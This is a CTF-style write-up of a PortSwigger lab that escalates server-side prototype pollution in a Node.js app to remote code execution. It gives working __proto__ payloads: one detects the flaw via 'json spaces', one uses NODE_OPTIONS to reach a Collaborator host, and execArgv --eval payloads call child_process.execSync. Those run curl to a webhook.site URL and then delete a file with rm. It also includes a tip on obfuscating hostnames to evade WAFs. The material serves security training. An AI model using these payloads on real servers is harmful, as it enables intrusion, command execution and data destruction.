# Remote code execution via server-side prototype pollution

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution), you'll learn: Remote code execution via server-side prototype pollution! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab is built on Node.js and the Express framework. It is vulnerable to server-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution) because it unsafely merges user-controllable input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute `Object.prototype` in such a way that you can inject arbitrary system commands that are subsequently executed on the server.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget that you can use to inject and execute arbitrary system commands.
3. Trigger remote execution of a command that deletes the file `/home/carlos/morale.txt`.

In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: `wiener:peter`

> Note:
>  
> When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222194500.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222194517.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222194526.png)

In here, we can update our billing and delivery address.

Let's try to update it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222194615.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222194621.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222194634.png)

When we clicked the "Submit" button, it'll send a POST request to `/my-account/change-address`, with parameter `address_line_1`, `address_line_2`, `city`, `postcode`, `country`, `sessionId` in JSON format:

```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "5nRtK7kb8P9i60GkjJHYKZPII7ywBO1n"
}
```

**If there's no error, the web application will respond a JSON data:**
```json
{
    "username": "wiener",
    "firstname": "Peter",
    "lastname": "Wiener",
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "isAdmin": true
}
```

**Since we're already an administrator, we can access to the admin panel:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222194843.png)

In here, we can "Run maintenance jobs".

Let's click on that button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222195000.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222195011.png)

When we clicked the "Run maintenance jobs", it'll send a POST request to `/admin/jobs`, with parameter `csrf`, `sessionId`, `tasks` in JSON format:

```json
{
    "csrf": "jhbK49bsOUjlWHpbaox8hurZWfNfVTB6",
    "sessionId": "5nRtK7kb8P9i60GkjJHYKZPII7ywBO1n",
    "tasks": [
        "db-cleanup",
        "fs-cleanup"
    ]
}
```

**If there's no error, the web application will respond a JSON data:**
```json
{
    "results": [
        {
            "name": "db-cleanup",
            "description": "Database cleanup",
            "success": true
        },
        {
            "name": "fs-cleanup",
            "description": "Filesystem cleanup",
            "success": true
        }
    ]
}
```

Armed with above information, we can try to **test the web application is vulnerable to server-side prototype pollution**!

In `/my-account/change-address`, `POST` or `PUT` requests that submit JSON data to an application or API are prime candidates for this kind of behavior as it's common for servers to respond with a JSON representation of the new or updated object. In this case, you could attempt to pollute the global `Object.prototype` with an arbitrary property.

### Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`

To do so, we could use `__proto__` to pollute the global `Object.prototype`, and using "JSON spaces override" technique to detect server-side prototype pollution:

```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "5nRtK7kb8P9i60GkjJHYKZPII7ywBO1n",
    "__proto__": {
        "json spaces": 1
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222195614.png)

As you can see, in the **raw** response JSON data, it has 1 space for the identation! That being said, it's indeed vulnerable to server-side prototype pollution.

### Identify a gadget that you can use to inject and execute arbitrary system commands

In the admin panel, we can run maintenance jobs, which are ***database and filesystem cleanup***.

Database and filesystem cleanup... This got me thinking **it's using OS command to complete that**!

There are a number of potential command execution sinks in Node, many of which occur in the `child_process` module. These are often invoked by a request that occurs asynchronously to the request with which you're able to pollute the prototype in the first place. As a result, the best way to identify these requests is by polluting the prototype with a payload that triggers an interaction with Burp Collaborator when called.

The `NODE_OPTIONS` environment variable enables you to define a string of command-line **arguments** that should be used by default whenever you start a new Node process. As this is also a property on the `env` object, you can potentially control this via prototype pollution if it is undefined.

Some of Node's functions for creating new child processes accept an optional `shell` property, which enables developers to set a specific shell, such as bash, in which to run commands. By combining this with a malicious `NODE_OPTIONS` property, you can pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created:

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

This way, you can easily identify when a request creates a new child process with command-line arguments that are controllable via prototype pollution.

> Tip:
>  
> The escaped double-quotes in the URL aren't strictly necessary. However, this can help to reduce false positives by obfuscating the URL to evade WAFs and other systems that scrape for hostnames.

Moreover, methods such as `child_process.spawn()` and `child_process.fork()` enable developers to create new Node subprocesses. The `fork()` method accepts an options object in which one of the potential options is the `execArgv` property. This is an array of strings containing command-line arguments that should be used when spawning the child process. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution.

As this gadget lets you directly control the command-line arguments, this gives you access to some attack vectors that wouldn't be possible using `NODE_OPTIONS`. Of particular interest is the `--eval` argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process. This can be quite powerful, even enabling you to load additional modules into the environment:

```json
"execArgv": [
    "--eval=require('<module>')"
]
```

In addition to `fork()`, the `child_process` module contains the `execSync()` method, which executes an arbitrary string as a system command. By chaining these JavaScript and [command injection](https://portswigger.net/web-security/os-command-injection) sinks, you can potentially escalate prototype pollution to gain full RCE capability on the server.

### Trigger remote execution of a command that deletes the file `/home/carlos/morale.txt`

Armed with above information, we can try to pollute the global `Object.prototype` to add arbitrary properties, which will then execute OS command!

But first, let's confirm it's really vulnerable to Remote Code Execution (RCE) via server-side prototype pollution.

**Payload:** (Inspired from [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#poisoning-__proto__))
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "QQsB0cKlcJXw90jYJXjy9WXsEDrxrMLQ",
    "__proto__": {
        "execArgv":[
            "--eval=require('child_process').execSync('curl https://webhook.site/9e750b29-46f0-4629-a07c-adeb8a7ed641')"
        ]
    }
}
```

**Send that payload in `/my-account/change-address`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222202022.png)

**Finally, run maintenance jobs again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222202058.png)

As you can see, both jobs failed.

However, you'll also notice that several DNS interactions have been received, which can confirm the web application is indeed vulnerable to RCE via server-side prototype pollution.

> Note: The lab will block all third party traffics except Burp Collaborator domain.

**Now, we can change the OS command to `rm /home/carlos/morale.txt`!**
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "QQsB0cKlcJXw90jYJXjy9WXsEDrxrMLQ",
    "__proto__": {
        "execArgv":[
            "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
        ]
    }
}
```

Send that payload request again:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222202349.png)

Then run maintenance jobs again:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222202400.png)

Hmm... the database cleanup job executed successfully, which means our payload should worked:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-9/images/Pasted%20image%2020230222202448.png)

# What we've learned:

1. Remote code execution via server-side prototype pollution